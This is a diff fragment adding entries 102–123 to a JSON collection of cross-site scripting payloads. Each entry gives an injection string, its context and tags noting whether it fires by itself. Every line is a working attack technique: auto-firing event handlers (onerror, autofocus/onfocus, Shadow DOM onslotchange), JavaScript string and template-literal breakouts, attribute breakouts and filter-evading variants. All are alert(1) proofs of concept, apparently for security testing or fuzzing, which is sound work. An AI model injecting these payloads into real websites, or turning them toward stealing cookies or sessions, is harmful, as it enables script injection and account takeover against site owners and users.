+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 102,
+      "code": "<video src=x onerror=alert(1)>",
+      "description": "video onerror — fires when video source fails to load",
+      "category": "special",
+      "context": ["html"],
+      "tags": ["html", "auto", "video", "onerror"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 103,
+      "code": "<input src=x onerror=alert(1)>",
+      "description": "input onerror — fires when input src attribute fails (image-type inputs)",
+      "category": "special",
+      "context": ["html"],
+      "tags": ["html", "auto", "input", "onerror"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 104,
+      "code": "<xss onsecuritypolicyviolation=alert(1)>XSS</xss>",
+      "description": "onsecuritypolicyviolation — fires when CSP is violated; useful in restrictive environments",
+      "category": "special",
+      "context": ["html"],
+      "tags": ["html", "attribute", "csp"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 105,
+      "code": "<xss oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>",
+      "description": "oncontentvisibilityautostatechange — fires when content-visibility:auto changes rendering state",
+      "category": "special",
+      "context": ["html"],
+      "tags": ["html", "auto", "attribute"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 106,
+      "code": "<input type=hidden oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto>",
+      "description": "oncontentvisibilityautostatechange on hidden input — bypasses visible element requirements",
+      "category": "special",
+      "context": ["html"],
+      "tags": ["html", "auto", "input", "attribute"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 107,
+      "code": "x<template shadowrootmode=open><slot onslotchange=alert(1)>",
+      "description": "onslotchange on Shadow DOM slot — fires when slotted content changes",
+      "category": "special",
+      "context": ["html"],
+      "tags": ["html", "auto", "shadow-dom"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 108,
+      "code": "<audio onwebkitplaybacktargetavailabilitychanged=alert(1)>",
+      "description": "WebKit AirPlay availability event — Safari-specific, fires on AirPlay target detection",
+      "category": "special",
+      "context": ["html"],
+      "tags": ["html", "auto", "audio", "webkit", "safari"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 109,
+      "code": "<geolocation onvalidationstatuschange=alert(1)>",
+      "description": "onvalidationstatuschange on geolocation element — fires on constraint validation change",
+      "category": "special",
+      "context": ["html"],
+      "tags": ["html", "auto", "attribute"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 110,
+      "code": "<input onfocus=alert(1) autofocus>",
+      "description": "Input onfocus autofocus — auto-executes on page load via autofocus attribute",
+      "category": "special",
+      "context": ["html"],
+      "tags": ["html", "auto", "input", "autofocus", "attribute"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 111,
+      "code": "<select autofocus onfocus=alert(1)>",
+      "description": "Select onfocus autofocus — auto-executes on page load via autofocus on select",
+      "category": "special",
+      "context": ["html"],
+      "tags": ["html", "auto", "attribute", "autofocus"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 112,
+      "code": "<textarea autofocus onfocus=alert(1)>",
+      "description": "Textarea onfocus autofocus — auto-executes on page load via autofocus",
+      "category": "special",
+      "context": ["html"],
+      "tags": ["html", "auto", "attribute", "autofocus"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 113,
+      "code": "<xss onselectstart=alert(1) style=display:block>select text in me</xss>",
+      "description": "onselectstart — fires when user starts a text selection in element",
+      "category": "special",
+      "context": ["html"],
+      "tags": ["html", "attribute"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 114,
+      "code": "';alert(1)//",
+      "description": "JS string breakout — closes single-quoted string, calls alert, comments rest",
+      "category": "special",
+      "context": ["javascript"],
+      "tags": ["javascript", "js-context", "no-angles", "auto"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 115,
+      "code": "\";alert(1)//",
+      "description": "JS string breakout — closes double-quoted string, calls alert, comments rest",
+      "category": "special",
+      "context": ["javascript"],
+      "tags": ["javascript", "js-context", "no-angles", "auto"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 116,
+      "code": "'+alert(1)+'",
+      "description": "JS string concat injection — breaks out of concatenated string expression",
+      "category": "special",
+      "context": ["javascript"],
+      "tags": ["javascript", "js-context", "no-angles", "auto"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 117,
+      "code": "\"+alert(1)+\"",
+      "description": "JS double-quote string concat injection — closes and re-opens double-quoted string",
+      "category": "special",
+      "context": ["javascript"],
+      "tags": ["javascript", "js-context", "no-angles", "auto"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 118,
+      "code": "`;alert(1)//",
+      "description": "JS template literal breakout — closes backtick template literal, executes alert",
+      "category": "special",
+      "context": ["javascript"],
+      "tags": ["javascript", "js-context", "no-angles", "auto"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 119,
+      "code": "'-alert(1)-'",
+      "description": "JS string subtraction injection — no parentheses needed variant using minus operator",
+      "category": "special",
+      "context": ["javascript"],
+      "tags": ["javascript", "js-context", "no-angles", "no-parens", "auto"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 120,
+      "code": "\" autofocus onfocus=\"alert(1)\"",
+      "description": "Attribute breakout — closes attribute, injects onfocus with autofocus for auto-exec",
+      "category": "interaction",
+      "context": ["attribute"],
+      "tags": ["attribute", "no-angles", "autofocus", "auto"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 121,
+      "code": "\" onmouseover=\"alert(1)\"",
+      "description": "Attribute breakout — closes attribute value, injects onmouseover handler",
+      "category": "interaction",
+      "context": ["attribute"],
+      "tags": ["attribute", "no-angles", "pointer", "interaction"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 122,
+      "code": "\" onclick=\"alert(1)\"",
+      "description": "Attribute breakout — closes attribute value, injects onclick handler",
+      "category": "interaction",
+      "context": ["attribute"],
+      "tags": ["attribute", "no-angles", "interaction"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 123,
+      "code": "' autofocus onfocus='alert(1)'",
+      "description": "Single-quote attribute breakout — closes single-quoted attribute, injects onfocus",
+      "category": "interaction",
+      "context": ["attribute"],
+      "tags": ["attribute", "no-angles", "autofocus", "auto"],
+      "auto_exec": true,
+      "verified": false
+    }
+  ]
+}
